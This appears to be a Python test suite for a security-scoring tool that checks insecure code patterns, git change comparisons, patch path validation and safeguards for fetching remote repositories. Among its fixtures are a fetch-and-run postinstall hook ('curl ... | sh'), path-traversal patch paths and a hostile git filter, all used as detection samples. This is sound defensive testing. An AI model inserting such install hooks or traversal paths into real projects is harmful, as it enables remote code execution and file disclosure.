"""REQ-01..06: real local scans, comparisons, rule examples and source boundaries."""

import contextlib
from collections import Counter
import gzip
import io
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import tarfile
import unittest
from unittest import mock


ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = ROOT / "skills/security-score/scripts"
sys.path.insert(0, str(SCRIPTS))
import score as cli  # noqa: E402
import score_core as core  # noqa: E402
import score_sources as sources  # noqa: E402
import score_remote as remote  # noqa: E402
import score_relevance as relevance  # noqa: E402


class ScoreTests(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory(prefix="security-score-test-")
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        self.repo = self.root / "source"
        self.repo.mkdir()

    def write(self, path, text):
        destination = self.repo / path
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_text(text)
        return destination

    def invoke(self, *args):
        output, errors = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(output), contextlib.redirect_stderr(errors):
            status = cli.main([str(self.repo), "--json", *args])
        return (
            status,
            json.loads(output.getvalue()) if output.getvalue() else None,
            errors.getvalue(),
        )

    def git(self, *args):
        result = subprocess.run(
            [
                "git",
                "-C",
                str(self.repo),
                "-c",
                "core.hooksPath=/dev/null",
                "-c",
                "user.name=Score test",
                "-c",
                "user.email=fixture@example.invalid",
                *args,
            ],
            capture_output=True,
            text=True,
            timeout=5,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        return result.stdout.strip()

    def init(self, source="requests.get(url, verify=True)\n"):
        self.git("init", "-b", "main")
        self.write("app.py", source)
        self.git("add", ".")
        self.git("commit", "--no-gpg-sign", "-m", "Baseline")
        return self.git("rev-parse", "HEAD")

    def test_catalog_has_verifiable_positive_and_negative_examples(self):
        result = cli.verify_rules()
        self.assertGreaterEqual(result["rules_verified"], 16)
        self.assertGreaterEqual(result["examples_verified"], 32)
        self.assertEqual(len({rule["id"] for rule in core.RULES}), len(core.RULES))

    def test_default_is_independent_read_only_and_reproducible(self):
        path = self.write("app.py", "requests.get(url, verify=True)\n")
        before = path.read_bytes()
        with mock.patch.object(
            cli.shutil,
            "which",
            side_effect=AssertionError("default consulted Analyzer"),
        ):
            first = self.invoke()
            second = self.invoke()
        self.assertEqual(first[0], 0)
        self.assertEqual(first[1], second[1])
        self.assertEqual(first[1]["engine"], "internal")
        self.assertEqual((first[1]["score"], first[1]["grade"]), (100, "A"))
        self.assertEqual(path.read_bytes(), before)
        self.assertEqual(list(self.repo.iterdir()), [path])

    def test_grade_boundaries(self):
        for score, expected in (
            (0, "F"),
            (49, "F"),
            (50, "E"),
            (59, "E"),
            (60, "D"),
            (69, "D"),
            (70, "C"),
            (79, "C"),
            (80, "B"),
            (89, "B"),
            (90, "A"),
            (100, "A"),
            (None, None),
        ):
            with self.subTest(score=score):
                self.assertEqual(core.grade(score), expected)

    def test_findings_without_control_baseline_reduce_score(self):
        self.write("app.py", "eval(payload)\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 0)
        self.assertEqual(result["score"], 59)
        self.assertEqual(result["findings"][0]["rule"], "PY-EXEC")
        self.assertEqual(result["grade"], "E")

    def test_severe_findings_are_not_offset_by_unrelated_controls(self):
        self.write(
            "app.py", "eval(payload)\n" + "requests.get(url, verify=True)\n" * 100
        )
        self.assertEqual(self.invoke()[1]["score"], 59)

    def test_unknown_controls_are_not_scored_as_satisfied(self):
        self.write("app.py", "subprocess.run(command, shell=setting)\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        self.assertIsNone(result["score"])
        self.assertIsNone(result["grade"])
        self.assertEqual(result["coverage"]["check_outcomes"]["unclear"], 1)
        self.assertTrue(all(row["score"] is None for row in result["areas"]))

    def test_sparse_source_has_no_score_or_grade(self):
        self.write("main.py", "print('hello')\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        self.assertEqual(result["verdict"], "undetermined")
        self.assertIsNone(result["grade"])

    def test_comments_and_string_examples_do_not_become_findings(self):
        self.write("app.py", "# eval(payload)\nexample = 'eval(payload)'\n")
        self.write(
            "app.js",
            "// eval(payload);\nconst example = 'element.innerHTML = payload';\n",
        )
        self.assertEqual(self.invoke()[1]["findings"], [])

    def test_source_and_secret_literals_are_not_reprinted(self):
        self.write("app.py", "eval('SYNTHETIC_PRIVATE_SOURCE_MARKER')\n")
        result = self.invoke()[1]
        self.assertNotIn("SYNTHETIC_PRIVATE_SOURCE_MARKER", json.dumps(result))

    def test_supplied_patch_records_locations_and_remote_identity(self):
        patch = self.root / "change.diff"
        patch.write_text(
            "--- a/app.py\n+++ b/app.py\n@@ -10 +10 @@\n-ast.literal_eval(payload)\n+eval(payload)\n"
        )
        status, result, _ = self.invoke(
            "--patch", str(patch), "--pr", "https://github.com/example/project/pull/42"
        )
        self.assertEqual(status, 0)
        self.assertEqual(result["scope"]["kind"], "change")
        self.assertEqual(result["findings"][0]["line"], 10)
        self.assertEqual(result["findings"][0]["change"], "introduced")
        self.assertIn("remote_selection", result["scope"])
        details = cli.render(result, details=True)
        self.assertIn("https://github.com/example/project/pull/42", details)
        self.assertIn("no independent remote retrieval", details)
        self.assertFalse((self.repo / "app.py").exists())

    def test_patch_paths_cannot_read_outside_source(self):
        for path in (
            "../../private.py",
            "/private.py",
            "C:\\private.py",
            ".git/config",
        ):
            with self.subTest(path=path):
                patch = self.root / "bad.diff"
                patch.write_text(
                    f"--- a/{path}\n+++ b/{path}\n@@ -1 +1 @@\n-print(1)\n+eval(payload)\n"
                )
                status, result, errors = self.invoke("--patch", str(patch))
                self.assertEqual(status, 1)
                self.assertIsNone(result)
                self.assertNotIn("Traceback", errors)

    def test_patch_hunk_counts_are_validated(self):
        patch = self.root / "bad.diff"
        patch.write_text(
            "--- a/app.py\n+++ b/app.py\n@@ -1,2 +1,2 @@\n-print(1)\n+eval(payload)\n"
        )
        self.assertEqual(self.invoke("--patch", str(patch))[0], 1)

    def test_patch_cannot_hide_metadata_changes_behind_documentation_hunks(self):
        documentation = (
            "diff --git a/README.md b/README.md\n"
            "--- a/README.md\n+++ b/README.md\n@@ -1 +1 @@\n"
            "-Example.\n+Another example.\n"
        )
        for metadata in (
            "diff --git a/app.py b/app.py\nold mode 100644\nnew mode 100755\n",
            "diff --git a/empty.txt b/empty.txt\nnew file mode 100644\n",
            "diff --git a/old.md b/AGENTS.md\nsimilarity index 100%\n"
            "rename from old.md\nrename to AGENTS.md\n",
            "diff --git a/linked.md b/linked.md\nnew file mode 120000\n"
            "--- /dev/null\n+++ b/linked.md\n@@ -0,0 +1 @@\n+target.md\n",
            "diff --git a/run.py b/run.py\nnew file mode 100755\n"
            "--- /dev/null\n+++ b/run.py\n@@ -0,0 +1 @@\n+print(1)\n",
        ):
            for patch_text in (documentation + metadata, metadata + documentation):
                with self.subTest(
                    metadata=metadata, first=patch_text.startswith(metadata)
                ):
                    patch = self.root / "metadata.diff"
                    patch.write_text(patch_text)
                    status, result, errors = self.invoke("--patch", str(patch))
                    self.assertEqual(status, 1)
                    self.assertIsNone(result)
                    self.assertIn("local Git comparison", errors)

    def test_separate_patch_hunks_cannot_form_a_synthetic_call(self):
        patch = self.root / "change.diff"
        patch.write_text(
            "--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n-old\n+eval(\n@@ -20 +20 @@\n-old\n+payload)\n"
        )
        result = self.invoke("--patch", str(patch))[1]
        self.assertEqual(result["findings"], [])
        self.assertNotIn("score", result)
        self.assertNotIn("grade", result)
        self.assertEqual(result["verdict"], "incomplete")
        self.assertEqual(result["relevance"], "unclear")

    def test_local_git_comparison_and_resolution(self):
        base = self.init()
        self.write("app.py", "eval(payload)\n")
        self.git("add", ".")
        self.git("commit", "--no-gpg-sign", "-m", "Introduce pattern")
        status, result, _ = self.invoke("--base", base)
        self.assertEqual(status, 0)
        self.assertEqual(result["findings"][0]["change"], "introduced")
        self.assertEqual(result["scope"]["base"], base)
        self.assertEqual(result["scope"]["head"], self.git("rev-parse", "HEAD"))
        self.assertEqual(
            self.invoke("--commit", "HEAD")[1]["findings"][0]["change"], "introduced"
        )

    def test_index_worktree_and_pre_existing_findings(self):
        self.init("eval(payload)\n")
        self.write("app.py", "eval(payload)\neval(other)\n")
        self.git("add", ".")
        staged = self.invoke("--staged")[1]
        self.assertEqual(
            Counter(f["change"] for f in staged["findings"]),
            {"pre_existing": 1, "worsened": 1},
        )
        self.write("app.py", "ast.literal_eval(payload)\n")
        unstaged = self.invoke("--unstaged")[1]
        self.assertEqual(
            Counter(f["change"] for f in unstaged["findings"]), {"resolved": 2}
        )
        self.assertEqual(unstaged["relevance"], "high")
        self.assertNotIn("score", unstaged)
        self.assertNotIn("grade", unstaged)

    def test_revision_injection_is_not_an_option(self):
        self.init()
        self.assertEqual(self.invoke("--base=--help")[0], 1)

    def test_symlinks_and_fifo_fail_closed(self):
        outside = self.root / "private.py"
        outside.write_text("eval(secret)\n")
        (self.repo / "link.py").symlink_to(outside)
        self.assertEqual(self.invoke()[0], 1)
        (self.repo / "link.py").unlink()
        if hasattr(os, "mkfifo"):
            os.mkfifo(self.repo / "fifo.py")
            self.assertEqual(self.invoke()[0], 1)

    def test_size_exclusions_keep_findings_but_withhold_grade(self):
        self.write("safe.py", "eval(payload)\n")
        self.write("large.py", "x" * (sources.MAX_FILE + 1))
        status, result, _ = self.invoke()
        self.assertEqual(status, 1)
        self.assertIsNone(result["grade"])
        self.assertEqual(len(result["findings"]), 1)

    def test_source_consistency_detects_changes(self):
        path = self.write("app.py", "eval(payload)\n")
        options = cli.parser().parse_args(["--repo", str(self.repo)])
        _, _, _, _, verify = sources.select(options, sources.Budget())
        path.write_text("ast.literal_eval(payload)\n")
        with self.assertRaises(sources.SourceError):
            verify()

    def test_untrusted_git_filter_cannot_execute(self):
        self.init()
        marker = self.root / "filter-executed"
        self.write(".gitattributes", "*.py filter=hostile\n")
        self.git("add", ".gitattributes")
        self.git("commit", "--no-gpg-sign", "-m", "Attributes")
        self.git("config", "filter.hostile.clean", f"touch {marker}")
        self.write("app.py", "eval(payload)\n")
        result = self.invoke("--unstaged")
        self.assertEqual(result[0], 0, result[2])
        self.assertFalse(marker.exists())

    def test_tool_timeout_and_output_are_bounded(self):
        with self.assertRaises(sources.SourceError):
            sources.command(
                [sys.executable, "-c", "import time; time.sleep(2)"],
                sources.Budget(0.1),
            )
        with self.assertRaises(sources.SourceError):
            sources.command(
                [sys.executable, "-c", "print('x'*10000)"], sources.Budget(), limit=1024
            )

    def test_remote_selection_needs_explicit_source_and_safe_host(self):
        for url in (
            "https://github.com/example/project/pull/42",
            "https://github.com@127.0.0.1/example/project/pull/42",
            "https://github.com/example/project/pull/42?credential=hidden",
        ):
            with self.subTest(url=url):
                self.assertEqual(self.invoke("--pr", url)[0], 1)

    def test_analyzer_never_silently_scores_change_input(self):
        with mock.patch.object(
            cli, "command", side_effect=AssertionError("Analyzer ran")
        ):
            self.assertEqual(self.invoke("--engine", "analyzer", "--staged")[0], 1)

    def test_analyzer_capabilities_and_result_identity(self):
        executable = self.root / "analyzer"
        executable.write_text("placeholder")
        executable.chmod(0o700)
        payload = {
            "verdict": "scored",
            "score": 17,
            "comparability": {"scoring_version": 2},
            "warnings": ["retained"],
            "unscored_findings": {"high": 2},
        }
        responses = [
            (0, json.dumps({"interface_version": 1}).encode()),
            (
                0,
                json.dumps(
                    {
                        "interface_version": 1,
                        "score": {
                            "available": True,
                            "model_calls": False,
                            "scoring_version": 2,
                        },
                    }
                ).encode(),
            ),
            (0, json.dumps(payload).encode()),
        ]
        with mock.patch.object(cli, "command", side_effect=responses):
            status, result, _ = self.invoke(
                "--engine", "analyzer", "--analyzer", str(executable)
            )
        self.assertEqual(status, 0)
        self.assertEqual(result["analyzer_result"], payload)
        self.assertEqual(result["grade"], "F")
        self.assertEqual(result["engine"], "analyzer")

    def test_analyzer_incompatible_or_malformed_output_never_becomes_a_score(self):
        executable = self.root / "analyzer"
        executable.write_text("isolated test placeholder")
        executable.chmod(0o700)
        version = (0, b'{"interface_version":1}')
        capability = {
            "interface_version": 1,
            "score": {"available": True, "model_calls": False, "scoring_version": 2},
        }
        for payload in (
            {
                "verdict": "scored",
                "score": True,
                "comparability": {"scoring_version": 2},
            },
            {"verdict": "scored", "score": 100, "comparability": None},
        ):
            with mock.patch.object(
                cli,
                "command",
                side_effect=[
                    version,
                    (0, json.dumps(capability).encode()),
                    (0, json.dumps(payload).encode()),
                ],
            ):
                status, result, errors = self.invoke(
                    "--engine", "analyzer", "--analyzer", str(executable)
                )
            self.assertEqual(status, 1)
            self.assertIsNone(result)
            self.assertNotIn("Traceback", errors)
        capability["score"]["model_calls"] = True
        with mock.patch.object(
            cli, "command", side_effect=[version, (0, json.dumps(capability).encode())]
        ) as command:
            status, result, _ = self.invoke(
                "--engine", "analyzer", "--analyzer", str(executable)
            )
        self.assertEqual(status, 1)
        self.assertIsNone(result)
        self.assertEqual(command.call_count, 2)

    def test_default_output_is_one_line_and_details_explain_it(self):
        self.write("app.py", "eval(payload)\n")
        for args, expected in (
            ([], "59/100 (E)\n"),
            (["--details"], "Calculation execution:"),
        ):
            output, errors = io.StringIO(), io.StringIO()
            with contextlib.redirect_stdout(output), contextlib.redirect_stderr(errors):
                status = cli.main([str(self.repo), *args])
            self.assertEqual(status, 0)
            if args:
                self.assertIn(expected, output.getvalue())
                self.assertIn("PY-EXEC", output.getvalue())
            else:
                self.assertEqual(output.getvalue(), expected)
                self.assertEqual(errors.getvalue(), "")

    def test_yaml_preserves_structured_result(self):
        # PyYAML is used only by this test if available, never by the runtime.
        try:
            import yaml
        except ImportError:
            self.skipTest("YAML consumer not installed")
        self.write("app.py", "eval(payload)\n")
        output = io.StringIO()
        with contextlib.redirect_stdout(output):
            status = cli.main([str(self.repo), "--yaml"])
        self.assertEqual(status, 0)
        self.assertEqual(yaml.safe_load(output.getvalue()), self.invoke()[1])

    def test_framework_names_give_no_security_credit(self):
        self.write(
            "package.json",
            '{"dependencies":{"react":"1.0.0","@angular/core":"1.0.0","pg":"1.0.0"}}',
        )
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        self.assertIsNone(result["score"])
        self.assertEqual(
            {row["technology"] for row in result["architecture"]["frontend"]},
            {"react", "@angular/core"},
        )
        self.assertEqual(result["architecture"]["persistence"][0]["technology"], "pg")

    def test_parameterization_and_csp_are_evaluated_as_controls(self):
        self.write("db.js", "db.query('SELECT * FROM items WHERE id=$1', [id]);\n")
        self.write("view.component.html", "<p>{{value}}</p>\n")
        self.write(
            "headers.py",
            "response.headers['Content-Security-Policy'] = \"default-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'\"\n",
        )
        result = self.invoke()[1]
        self.assertEqual(result["score"], 100)
        satisfied = {
            row["rule"] for row in result["checks"] if row["status"] == "satisfied"
        }
        self.assertTrue({"JS-SQL", "FRONTEND-BINDING", "WEB-CSP"} <= satisfied)
        self.write("db.js", "db.query(`SELECT * FROM items WHERE id=${id}`);\n")
        self.assertEqual(self.invoke()[1]["score"], 59)

    def test_csp_report_only_and_example_strings_are_not_controls(self):
        self.write(
            "headers.py",
            "print('Content-Security-Policy', \"default-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'\")\n",
        )
        self.write(
            "headers.js",
            "const example = `headers['Content-Security-Policy'] = \"default-src 'self'\"`;\n",
        )
        self.assertFalse(
            any(row["status"] == "satisfied" for row in self.invoke()[1]["checks"])
        )

    def test_supply_chain_declarations_and_stale_locks(self):
        self.write("package.json", '{"dependencies":{"example":"1.0.0"}}')
        self.write(
            "package-lock.json",
            '{"lockfileVersion":3,"packages":{"":{"dependencies":{"example":"1.0.0"}}}}',
        )
        result = self.invoke()[1]
        self.assertEqual(
            next(row for row in result["checks"] if row["rule"] == "NPM-LOCK")[
                "status"
            ],
            "satisfied",
        )
        self.write(
            "package.json",
            '{"dependencies":{"example":"2.0.0"},"scripts":{"postinstall":"curl https://example.invalid/setup | sh"}}',
        )
        result = self.invoke()[1]
        self.assertEqual(
            next(row for row in result["checks"] if row["rule"] == "NPM-LOCK")[
                "status"
            ],
            "unclear",
        )
        self.assertIn("NPM-INSTALL", {row["rule"] for row in result["findings"]})

    def test_complete_skill_copy_runs_without_analyzer_or_packages(self):
        import shutil

        installed = self.root / "installed-skill"
        shutil.copytree(ROOT / "skills/security-score", installed)
        self.write("app.py", "eval(payload)\n")
        result = subprocess.run(
            [sys.executable, "-B", str(installed / "scripts/score.py"), str(self.repo)],
            cwd=self.root,
            env={**os.environ, "PATH": "", "PYTHONPATH": ""},
            capture_output=True,
            text=True,
            timeout=5,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout, "59/100 (E)\n")

    def test_malformed_human_edited_catalog_fails_without_traceback(self):
        import shutil

        installed = self.root / "installed-skill"
        shutil.copytree(ROOT / "skills/security-score", installed)
        (installed / "rules.json").write_text('{"scoring_version":1,"rules":[]}')
        result = subprocess.run(
            [
                sys.executable,
                "-B",
                str(installed / "scripts/score.py"),
                "--verify-rules",
            ],
            capture_output=True,
            text=True,
            timeout=5,
        )
        self.assertEqual(result.returncode, 1)
        self.assertIn("Invalid bundled rule catalog", result.stderr)
        self.assertNotIn("Traceback", result.stderr)

    def test_parse_failure_keeps_other_findings_without_a_grade(self):
        self.write("app.py", "eval(payload)\n")
        self.write("broken.py", "def broken(\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 1)
        self.assertIsNone(result["grade"])
        self.assertTrue(any(row["rule"] == "PY-EXEC" for row in result["findings"]))

    def test_finding_limit_retains_available_observations(self):
        self.write("app.py", "eval(payload)\n" * 5001)
        status, result, _ = self.invoke()
        self.assertEqual(status, 1)
        self.assertEqual(len(result["findings"]), 5000)
        self.assertIsNone(result["score"])
        self.assertIsNone(result["grade"])

    def test_cancellation_does_not_publish_a_result(self):
        with mock.patch.object(cli, "run", side_effect=KeyboardInterrupt):
            status, result, errors = self.invoke()
        self.assertEqual(status, 130)
        self.assertIsNone(result)
        self.assertIn("cancelled", errors)

    def test_overlapping_patch_hunks_are_rejected(self):
        patch = self.root / "bad.diff"
        patch.write_text(
            "--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n-old\n+eval(payload)\n@@ -1 +1 @@\n-old\n+eval(payload)\n"
        )
        self.assertEqual(self.invoke("--patch", str(patch))[0], 1)

    def test_replaced_same_count_findings_are_not_silently_pre_existing(self):
        self.init("def old_handler(payload):\n    return eval(payload)\n")
        self.write("app.py", "def new_handler(payload):\n    return eval(payload)\n")
        result = self.invoke("--worktree")[1]
        self.assertEqual(
            Counter(row["change"] for row in result["findings"]),
            {"introduced": 1, "resolved": 1},
        )
        self.assertEqual(result["relevance"], "high")
        self.assertNotIn("score", result)
        self.assertNotIn("grade", result)
        self.assertNotIn("_identity", json.dumps(result))

    def test_line_shifts_preserve_existing_observation_identity(self):
        self.init("def handler(payload):\n    return eval(payload)\n")
        self.write(
            "app.py",
            "# Extra explanation\n\ndef handler(payload):\n    return eval(payload)\n",
        )
        result = self.invoke("--worktree")[1]
        old, _ = core.scan(
            {"app.py": {"text": "def handler(payload):\n    return eval(payload)\n"}},
            sources.Budget(),
        )
        new, _ = core.scan(
            {
                "app.py": {
                    "text": "# Extra explanation\n\ndef handler(payload):\n    return eval(payload)\n"
                }
            },
            sources.Budget(),
        )
        self.assertEqual(
            [row["change"] for row in core.compare(old, new)], ["pre_existing"]
        )
        self.assertEqual(result["findings"], [])
        self.assertEqual(result["relevance"], "low")
        self.assertNotIn("score", result)
        self.assertNotIn("grade", result)

    def test_incomplete_comparison_cannot_claim_a_finding_is_resolved(self):
        self.init("eval(payload)\n")
        self.write("app.py", "def broken(\n")
        status, result, _ = self.invoke("--worktree")
        self.assertEqual(status, 1)
        self.assertEqual([row["change"] for row in result["findings"]], ["unresolved"])
        self.assertNotIn("grade", result)
        self.assertNotIn("score", result)

    def test_change_scope_recheck_detects_new_files(self):
        self.init()
        self.write("app.py", "eval(payload)\n")
        options = cli.parser().parse_args(["--repo", str(self.repo), "--worktree"])
        *_, verify = sources.select(options, sources.Budget())
        self.write("added.py", "eval(other)\n")
        with self.assertRaises(sources.SourceError):
            verify()

    def test_safe_authentication_change_is_relevant_without_a_finding(self):
        self.init("def view(user):\n    return user.name\n")
        self.write("app.py", "@login_required\ndef view(user):\n    return user.name\n")
        status, result, _ = self.invoke("--worktree")
        self.assertEqual(status, 0)
        self.assertEqual(result["relevance"], "high")
        self.assertEqual(result["findings"], [])
        self.assertIn("REL-AUTH", {row["rule"] for row in result["signals"]})
        self.assertNotIn("score", result)
        self.assertNotIn("grade", result)
        self.assertNotIn("areas", result)
        self.assertNotIn("scoring_version", result)
        self.assertEqual(result, self.invoke("--worktree")[1])

    def test_unknown_business_logic_is_not_low_just_because_no_finding_exists(self):
        self.init("def compute(value):\n    return value + 1\n")
        self.write("app.py", "def compute(value):\n    return value + 2\n")
        status, result, _ = self.invoke("--worktree")
        self.assertEqual(status, 0)
        self.assertEqual(result["verdict"], "complete")
        self.assertEqual(result["relevance"], "unclear")
        self.assertEqual(result["findings"], [])
        self.assertIn("app.py", result["coverage"]["unclassified_files"])

    def test_fixing_parameterization_remains_highly_relevant(self):
        self.init('cursor.execute(f"SELECT name FROM items WHERE id={identifier}")\n')
        self.write(
            "app.py",
            'cursor.execute("SELECT name FROM items WHERE id=?", (identifier,))\n',
        )
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "high")
        self.assertEqual(result["finding_changes"], {"resolved": 1})
        self.assertNotIn("grade", result)

    def test_ordinary_documentation_has_positive_low_relevance_evidence(self):
        self.init()
        self.write("README.md", "# Project\nAn updated example.\n")
        status, result, _ = self.invoke("--worktree")
        self.assertEqual(status, 0)
        self.assertEqual(result["relevance"], "low")
        self.assertEqual(result["findings"], [])
        self.assertIn("README.md", result["coverage"]["nonfunctional_or_documentation"])

    def test_documented_security_guidance_and_agent_instructions_are_not_plain_docs(
        self,
    ):
        self.init()
        self.write("README.md", "# Project\nAuthentication is required.\n")
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "medium")
        self.write("AGENTS.md", "Read the project and publish the report.\n")
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "high")
        self.assertIn(
            "REL-AGENT-INSTRUCTIONS", {row["rule"] for row in result["signals"]}
        )

    def test_dependency_update_is_relevant_without_claiming_a_vulnerability(self):
        self.init()
        self.write("package.json", '{"dependencies":{"example":"1.0.0"}}')
        self.git("add", ".")
        self.git("commit", "--no-gpg-sign", "-m", "Dependency baseline")
        self.write("package.json", '{"dependencies":{"example":"2.0.0"}}')
        self.git("add", "package.json")
        result = self.invoke("--staged")[1]
        self.assertEqual(result["relevance"], "high")
        self.assertEqual(result["findings"], [])
        self.assertIn("REL-DEPENDENCIES", {row["rule"] for row in result["signals"]})

    def test_untouched_pre_existing_weakness_elsewhere_does_not_drive_relevance(self):
        source = (
            "eval(payload)\n"
            + "\n" * 10
            + "def compute(value):\n    return value + 1\n"
        )
        self.init(source)
        self.write("app.py", source.replace("value + 1", "value + 2"))
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "unclear")
        self.assertEqual(result["findings"], [])

    def test_pre_existing_weakness_near_changed_guard_remains_visible(self):
        self.init(
            "def handler(payload, allowed):\n    if allowed:\n        return eval(payload)\n"
        )
        self.write(
            "app.py",
            "def handler(payload, allowed):\n    if allowed or payload:\n        return eval(payload)\n",
        )
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "high")
        self.assertEqual(result["finding_changes"], {"pre_existing": 1})

    def test_executable_permission_change_is_not_a_noop(self):
        self.init("print(1)\n")
        (self.repo / "app.py").chmod(0o755)
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "high")
        self.assertIn("REL-EXECUTABLE-MODE", {row["rule"] for row in result["signals"]})

    def test_unexamined_binary_prevents_low_relevance(self):
        self.init()
        self.write("README.md", "An example.\n")
        (self.repo / "asset.png").write_bytes(b"\x89PNG\0")
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "unclear")
        self.assertIn("asset.png", result["coverage"]["unclassified_files"])

    def test_new_document_context_does_not_follow_links(self):
        self.init()
        outside = self.root / "private.md"
        outside.write_text("PRIVATE_CONTEXT_MARKER")
        (self.repo / "README.md").symlink_to(outside)
        status, result, errors = self.invoke("--worktree")
        self.assertEqual(status, 1)
        self.assertIsNone(result)
        self.assertNotIn("PRIVATE_CONTEXT_MARKER", errors)

    def test_change_text_output_is_relevance_not_a_grade(self):
        self.init("def view(user):\n    return user.name\n")
        self.write("app.py", "@login_required\ndef view(user):\n    return user.name\n")
        for extra in ([], ["--details"]):
            output = io.StringIO()
            with (
                contextlib.redirect_stdout(output),
                contextlib.redirect_stderr(io.StringIO()),
            ):
                status = cli.main([str(self.repo), "--worktree", *extra])
            self.assertEqual(status, 0)
            self.assertTrue(output.getvalue().startswith("Security relevance: high"))
            self.assertNotIn("/100", output.getvalue())
            self.assertNotIn("grade", output.getvalue())
            if extra:
                self.assertIn("REL-AUTH", output.getvalue())
                self.assertIn("Comparison:", output.getvalue())

    def test_signal_limit_keeps_evidence_for_a_later_stronger_level(self):
        after = {
            f"guide-{number:04d}.md": {"text": "Authentication guidance changed.\n"}
            for number in range(1001)
        }
        after["z.py"] = {"text": "token = supplied\n"}
        result = relevance.analyze({}, after, [], [], [], sources.Budget())
        self.assertEqual(result["relevance"], "high")
        self.assertTrue(result["coverage"]["signals_truncated"])
        self.assertEqual(len(result["signals"]), 1000)
        self.assertTrue(any(row["level"] == "high" for row in result["signals"]))


class RemoteTests(unittest.TestCase):
    @staticmethod
    def archive(entries):
        raw = io.BytesIO()
        with tarfile.open(fileobj=raw, mode="w") as archive:
            for path, content, kind in entries:
                item = tarfile.TarInfo(path)
                item.type = kind
                if kind == tarfile.REGTYPE:
                    item.size = len(content)
                    archive.addfile(item, io.BytesIO(content))
                else:
                    item.linkname = "../../outside.py"
                    archive.addfile(item)
        return gzip.compress(raw.getvalue())

    def test_only_explicit_canonical_supported_git_urls(self):
        self.assertEqual(
            remote.repository_url("https://github.com/example/project.git"),
            ("github.com", "example/project"),
        )
        self.assertEqual(
            remote.repository_url("https://gitlab.com/group/team/project"),
            ("gitlab.com", "group/team/project"),
        )
        for url in (
            "http://github.com/example/project",
            "https://github.com@127.0.0.1/example/project",
            "https://github.com/example/../project",
            "https://github.com/example/project?token=hidden",
            "https://github.com:444/example/project",
        ):
            with self.subTest(url=url), self.assertRaises(sources.SourceError):
                remote.repository_url(url)

    def test_private_metadata_and_mapped_ipv6_destinations_are_rejected(self):
        for address in (
            "127.0.0.1",
            "169.254.169.254",
            "10.0.0.1",
            "::1",
            "::ffff:127.0.0.1",
        ):
            with (
                self.subTest(address=address),
                mock.patch.object(
                    remote.socket,
                    "getaddrinfo",
                    return_value=[(2, 1, 6, "", (address, 443))],
                ),
            ):
                with self.assertRaises(sources.SourceError):
                    remote.public_addresses("github.com", sources.Budget())

    def test_http_connect_uses_checked_ip_and_keeps_tls_hostname(self):
        connection = mock.Mock()
        context = mock.Mock()
        connection._context = context
        response = mock.Mock(status=200)
        response.getheader.return_value = None
        response.read.side_effect = [b"{}", b""]
        connection.getresponse.return_value = response
        raw_socket = mock.Mock()
        with (
            mock.patch.object(
                remote,
                "public_addresses",
                return_value=[(2, 1, 6, "", ("8.8.8.8", 443))],
            ),
            mock.patch.object(
                remote.http.client, "HTTPSConnection", return_value=connection
            ),
            mock.patch.object(remote.socket, "socket", return_value=raw_socket),
        ):
            value, status = remote.get(
                "https://api.github.com/repos/example/project", sources.Budget()
            )
        self.assertEqual((value, status), (b"{}", 200))
        raw_socket.connect.assert_called_once_with(("8.8.8.8", 443))
        context.wrap_socket.assert_called_once_with(
            raw_socket, server_hostname="api.github.com"
        )

    def test_redirects_do_not_authorize_new_hosts_or_forward_credentials(self):
        first, second = mock.Mock(), mock.Mock()
        redirection = mock.Mock(status=302)
        redirection.getheader.return_value = (
            "https://codeload.github.com/example/project/tar.gz/commit"
        )
        success = mock.Mock(status=200)
        success.getheader.return_value = None
        success.read.side_effect = [b"archive", b""]
        first.getresponse.return_value, second.getresponse.return_value = (
            redirection,
            success,
        )
        with (
            mock.patch.object(
                remote,
                "public_addresses",
                return_value=[(2, 1, 6, "", ("8.8.8.8", 443))],
            ),
            mock.patch.object(
                remote.http.client, "HTTPSConnection", side_effect=[first, second]
            ),
            mock.patch.object(remote.socket, "socket", return_value=mock.Mock()),
        ):
            remote.get(
                "https://api.github.com/repos/example/project/tarball/commit",
                sources.Budget(),
                token="isolated-test-value",
                token_host="api.github.com",
                archive=True,
            )
        self.assertIn("Authorization", first.request.call_args.kwargs["headers"])
        self.assertNotIn("Authorization", second.request.call_args.kwargs["headers"])
        redirection.getheader.return_value = "https://gitlab.com/unselected/project"
        with (
            mock.patch.object(
                remote,
                "public_addresses",
                return_value=[(2, 1, 6, "", ("8.8.8.8", 443))],
            ),
            mock.patch.object(
                remote.http.client, "HTTPSConnection", return_value=first
            ),
            mock.patch.object(remote.socket, "socket", return_value=mock.Mock()),
        ):
            with self.assertRaises(sources.SourceError):
                remote.get(
                    "https://api.github.com/repos/example/project/tarball/commit",
                    sources.Budget(),
                    archive=True,
                )

    def test_unreadable_host_settings_remain_unknown(self):
        with mock.patch.object(
            remote, "json_get", return_value=({}, "not readable (HTTP 403)")
        ):
            settings, revision, archive = remote.host_settings(
                "github.com", "example/project", sources.Budget()
            )
        self.assertIsNone(revision)
        self.assertIsNone(archive)
        self.assertTrue(all(row["status"] == "unknown" for row in settings))
        findings, checks = remote.settings_checks(settings)
        self.assertEqual(findings, [])
